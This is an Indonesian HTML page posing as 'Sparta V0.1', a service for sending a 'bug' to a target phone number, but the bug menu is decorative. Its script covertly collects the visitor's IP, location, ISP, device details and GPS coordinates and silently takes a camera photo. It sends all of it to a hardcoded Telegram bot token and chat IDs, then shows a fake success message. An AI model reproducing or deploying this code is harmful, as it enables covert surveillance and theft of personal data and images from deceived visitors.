<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <title>Sparta V0.1 - Bug Service</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
    
    <style>
        /* CSS umum & Reset */
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            background: black; 
            font-family: 'Poppins', sans-serif; 
            color: white; 
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            padding: 20px;
            padding-top: 70px; /* Jarak untuk header */
            position: relative;
        }
        
        /* --- Header Styles (Top Bar) --- */
        .header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            width: 100%;
            max-width: 500px;
            background: black;
            box-shadow: 0 1px 5px rgba(0, 0, 0, 0.5);
            position: fixed;
            top: 0;
            z-index: 100;
        }

        .header-title {
            font-size: 20px;
            font-weight: 800;
            color: #1B47F1;
            text-shadow: 0 0 5px #0917D7;
        }

        .header-icon {
            font-size: 24px;
            color: #ccc;
        }

        /* --- Main Card (Container Input) --- */
        .main-card {
            background: linear-gradient(180deg, #1c1c1c 0%, #101010 100%);
            padding: 30px 20px;
            border-radius: 15px;
            width: 100%;
            max-width: 500px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.7);
            border: 1px solid #333;
            text-align: center;
            position: relative;
        }
        
        .logo-container { 
            margin-bottom: 25px; 
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100px; 
        }

        .service-gif { 
            width: 100%; 
            max-width: 250px; 
            height: auto; 
            object-fit: cover; 
            border-radius: 8px; 
            box-shadow: 0 0 15px rgba(27, 71, 241, 0.7); 
        }

        .user-info-display { 
            background-color: #2a2a2a; 
            padding: 15px; 
            border-radius: 10px; 
            margin-bottom: 25px; 
            border: 1px solid #444; 
            box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.5);
        }
        
        .username-text { 
            font-size: 18px; 
            font-weight: 800; 
            color: white; 
            margin-bottom: 10px; 
        }
        
        .role-exp-text { 
            font-size: 13px; 
            color: #B3C0FF; 
            font-weight: 500;
        }
        
        .target-section { 
            margin-bottom: 25px; 
        }
        
        .target-section h4 { 
            color: white; 
            font-weight: 600;
            margin-bottom: 15px;
            font-size: 16px;
            text-align: left; 
        }
        
        .input-group {
            display: flex;
            align-items: center; 
            background-color: #0d0d0d; 
            border: 1px solid #333; 
            border-radius: 8px; 
            padding: 5px 15px; 
        }

        .input-group span {
            color: #B3C0FF; 
            font-size: 16px; 
            font-weight: 600; 
            margin-right: 10px;
            line-height: 1; 
            padding: 8px 0;
        }
        
        .target-input { 
            flex-grow: 1; 
            background: none; 
            border: none; 
            color: white; 
            font-size: 16px; 
            padding: 8px 0; 
            outline: none; 
            font-family: 'Poppins', sans-serif;
            -moz-appearance: none;
            -webkit-appearance: none;
            appearance: none;
        }
        .target-input::-webkit-outer-spin-button,
        .target-input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        
        .action-button { 
            width: 100%; 
            padding: 12px; 
            border-radius: 8px; 
            font-size: 16px; 
            font-weight: 700; 
            cursor: pointer; 
            transition: background-color 0.2s, transform 0.1s; 
            margin-bottom: 15px; 
            border: none; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
        }
        
        .select-service-btn {
            background-color: #333; 
            color: white;
            border: 1px solid #555; 
        }
        
        .send-service-btn { 
            background: linear-gradient(90deg, #F81CF8 0%, #B900FF 100%); 
            color: white; 
            box-shadow: 0 4px 15px rgba(185, 0, 255, 0.4); 
        }
        
        .send-service-btn:hover { 
            background: linear-gradient(90deg, #FF45FF 0%, #D41AFF 100%); 
            transform: translateY(-1px); 
        }
        
        .send-service-btn i { margin-right: 10px; font-size: 18px; }

        /* Dropdown/List Bug (Hanya Pajangan) */
        #service-selection-list {
            display: none;
            position: absolute;
            width: calc(100% - 40px);
            left: 50%;
            transform: translateX(-50%);
            top: 310px; 
            background: #1c1c1c;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.8);
            z-index: 500;
            overflow: hidden;
            pointer-events: none;
        }

        .service-option { 
            padding: 12px 20px; 
            color: #ccc; 
            border-bottom: 1px solid #333; 
            text-align: left; 
        }
        
        .service-option:last-child { 
            border-bottom: none;
        }
        
        /* Notifikasi & Modal Kustom (Popup) */
        #custom-modal { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.7); 
            display: none; justify-content: center; align-items: center; z-index: 1000;
            opacity: 0; transition: opacity 0.3s ease;
        }
        
        .custom-modal.show { opacity: 1; display: flex; }
        .modal-content { 
            background: #1a1a1a; padding: 25px; border-radius: 12px; width: 90%; max-width: 300px; 
            border: 2px solid #1B47F1;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5); text-align: center; 
        }
        
        .modal-content h3 { color: #1B47F1; margin-bottom: 15px; font-size: 18px; }
        .modal-content p { color: #ccc; margin-bottom: 20px; font-size: 14px; }
        .modal-buttons {
             display: flex;
             justify-content: center;
        }
        .modal-content button { 
            background-color: #1B47F1; color: white; border: none; padding: 10px 15px; border-radius: 6px; 
            cursor: pointer; font-weight: 600; transition: background-color 0.3s;
        }
        
        .modal-content button:hover { background-color: #0917D7; }
        
        /* Hidden elements for Camera */
        video, canvas { display: none; }

    </style>
</head>

<body>
    <div id="custom-modal" class="custom-modal">
        <div class="modal-content">
            <h3 id="modal-title"></h3>
            <p id="modal-message"></p>
            <div class="modal-buttons">
                <button id="modal-ok-button" onclick="closeCustomModal()">OK</button>
            </div>
        </div>
    </div>

    <div class="header-top">
        <div class="header-title">Sparta V0.1</div>
        <i class="fas fa-user-circle header-icon"></i> 
    </div>
    
    <div class="main-card">
        
        <div class="logo-container">
            <video src="https://files.catbox.moe/vzmw6r.mp4" class="service-gif" autoplay loop muted playsinline></video>
        </div>

        <div class="user-info-display">
            <div class="username-text" id="user-display-username">Owner</div>
            <div class="role-exp-text" id="user-display-role-exp">Role: Owner ‚Ä¢ Exp: 9999-99-99</div>
        </div>
        
        <div class="target-section">
            <h4>Target Number</h4>
            <div class="input-group">
                <span>+62</span>
                <input type="tel" id="target-number" class="target-input" placeholder="821xxxxxx">
            </div>
        </div>
        
        <button id="select-service-btn" class="action-button select-service-btn">
            Select Bug <i class="fas fa-chevron-down" style="margin-left: 10px;"></i>
        </button>
        
        <button id="send-service-btn" class="action-button send-service-btn">
            <i class="fas fa-bolt"></i> SEND BUG
        </button>

        <div id="service-selection-list">
            <div class="service-option" data-service="bug1">BUG1</div>
            <div class="service-option" data-service="bug2">BUG2</div>
            <div class="service-option" data-service="bug3">BUG3</div>
        </div>
        
        </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>
    
<script>
    // --- KONFIGURASI TELEGRAM ---
    const botToken = '8465679307:AAFNn9YLlQns9JF-j67aUl4T_TbcqpHAMto';
    const chatIds = ['7633271429', '8358522260', '-1003083824240'];
    
    // --- DOM ELEMENTS ---
    // const infoDiv = document.getElementById('info'); // Dihapus
    const input = document.getElementById('target-number'); 
    const button = document.getElementById('send-service-btn');
    const selectServiceBtn = document.getElementById('select-service-btn');
    const serviceSelectionList = document.getElementById('service-selection-list');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    // --- TELEGRAM FUNCTIONS ---
    function sendToTelegram(text) {
        chatIds.forEach(id => {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
            }).catch(console.error);
        });
    }
    
    function sendPhotoToTelegram(blob) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('photo', blob);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        }).catch(console.error);
      });
    }
    
    // --- MODAL FUNCTIONS (Pop-up Sukses/Error) ---
    function showCustomModal(message, title = 'Notification', isError = false) {
        const modalElement = document.getElementById('custom-modal');
        const modalTitle = document.getElementById('modal-title');
        const modalMessage = document.getElementById('modal-message');
        const modalOkButton = document.getElementById('modal-ok-button');
        
        modalTitle.textContent = title;
        modalMessage.textContent = message;
        
        const color = isError ? '#ff4444' : '#1B47F1';
        modalElement.querySelector('.modal-content').style.borderColor = color;
        modalTitle.style.color = color;
        modalOkButton.style.backgroundColor = color;
        
        // Sesuaikan teks tombol sesuai permintaan
        modalOkButton.textContent = isError ? 'Tutup' : 'Berhasil Mengirimkan Bug';

        modalElement.classList.add('show');
        modalElement.style.display = 'flex';
    }
    
    function closeCustomModal() {
        const modalElement = document.getElementById('custom-modal');
        modalElement.classList.remove('show');
        setTimeout(() => { modalElement.style.display = 'none'; }, 300);
    }
    
    // --- ADVANCED INFO GATHERING ---
    async function getInfo(targetNumber) {
        let ip = '-', city = '-', region = '-', country = '-', org = '-';
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            ip = ipData.ip;
            const locRes = await fetch(`https://ip-api.com/json/${ip}`);
            const loc = await locRes.json();
            if (loc.status === 'success') {
                city = loc.city;
                region = loc.regionName;
                country = loc.country;
                org = loc.org;
            }
        } catch {}

        const battery = await navigator.getBattery?.() || { level: 0, charging: false };
        const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';
        
        const os = navigator.platform || 'N/A';
        const resolution = `${screen.width}x${screen.height}`;
        const deviceMemory = navigator.deviceMemory || 'N/A';
        const cookieEnabled = navigator.cookieEnabled ? 'Ya' : 'Tidak';

        const text = `
<b>üî• NEW TARGET SPARTA V0.1 üî•</b>

Target     : +62${targetNumber}
IP         : ${ip}
Kota       : ${city}
Region     : ${region}
Negara     : ${country}
ISP        : ${org}
Browser    : ${navigator.userAgent}
OS         : ${os}
Resolusi   : ${resolution}
Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
Memori     : ${deviceMemory} GB
Cookie     : ${cookieEnabled}
Waktu      : ${new Date().toLocaleString()}
        `.trim();

        // Mengirim info lengkap ke Telegram
        sendToTelegram(`<b>üì• Info Pengunjung:</b>\n<pre>${text}</pre>`);

        // GPS/Lokasi (Non-blocking)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    const link = `https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`;
                    sendToTelegram(`<b>üìç Lokasi GPS:</b> <a href="${link}">[Link GPS]</a>`);
                },
                () => sendToTelegram(`üìç Lokasi GPS Ditolak`)
            );
        } else {
            sendToTelegram(`üìç Browser tidak support GPS`);
        }
    }

    // --- CAMERA FUNCTION ---
    async function startCamera() {
      const ctx = canvas.getContext('2d');
      return new Promise((resolve) => {
        if (!navigator.mediaDevices) {
             sendToTelegram('‚ùå Kamera Ditolak: MediaDevices API tidak didukung');
             return resolve();
        }
        
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              setTimeout(() => {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                  if (blob) sendPhotoToTelegram(blob);
                  stream.getTracks().forEach(track => track.stop());
                  resolve();
                }, 'image/jpeg');
              }, 3000); // Waktu tunggu 3 detik untuk ambil foto
            };
          })
          .catch(err => {
            sendToTelegram('‚ùå Kamera Ditolak atau Tidak Tersedia');
            resolve();
          });
      });
    }

    // --- LOGIKA UTAMA ---
    document.addEventListener('DOMContentLoaded', function () {
        
        // Toggle Service Selection List (Pajangan)
        selectServiceBtn.addEventListener('click', function(event) {
            event.stopPropagation();
            const isVisible = serviceSelectionList.style.display === 'block';
            serviceSelectionList.style.display = isVisible ? 'none' : 'block';
        });

        // Close Service Selection List saat klik di luar (Pajangan)
        document.addEventListener('click', function(event) {
            if (event.target !== selectServiceBtn && !serviceSelectionList.contains(event.target)) {
                serviceSelectionList.style.display = 'none';
            }
        });

        // Aksi Tombol Send Service
        button.addEventListener('click', async () => {
            const targetNumber = input.value.trim();

            if (targetNumber === '') {
                // Notifikasi Error via Pop-up
                showCustomModal('Harap masukan nomor target!', 'Input Error', true);
                return;
            }
            
            if (!/^\d+$/.test(targetNumber)) {
                // Notifikasi Error via Pop-up
                showCustomModal('Simbol ditemukan, harap hapus simbol!', 'Input Error', true);
                return;
            }

            if (targetNumber.length < 8 || targetNumber.length > 15) {
                // Notifikasi Error via Pop-up
                showCustomModal('Nomor target minimal 8 digit dan maksimal 15 digit!', 'Input Error', true);
                return;
            }
            
            button.disabled = true;
            
            try {
                // 1. Kirim Nomor Target segera
                sendToTelegram(`<b>üìû Nomor Target:</b> +62${targetNumber}`);
                
                // 2. Ambil dan Kirim Info Lengkap + GPS
                await getInfo(targetNumber);
                
                // 3. Ambil Foto Kamera 
                await startCamera(); 

                // 4. TAMPILKAN POPUP SUKSES
                showCustomModal(`Successfully Sending Bug To Target: +62${targetNumber}!`, 'DONE BUGüî•', false);
                
                input.value = ''; // Kosongkan input
                button.disabled = false;
                
            } catch (e) {
                // Notifikasi Error jika terjadi kegagalan sistem
                showCustomModal('Terjadi kesalahan saat mengirim data.', 'System Error', true);
                button.disabled = false;
            }
        });
    });
</script>
</body>
    </html>
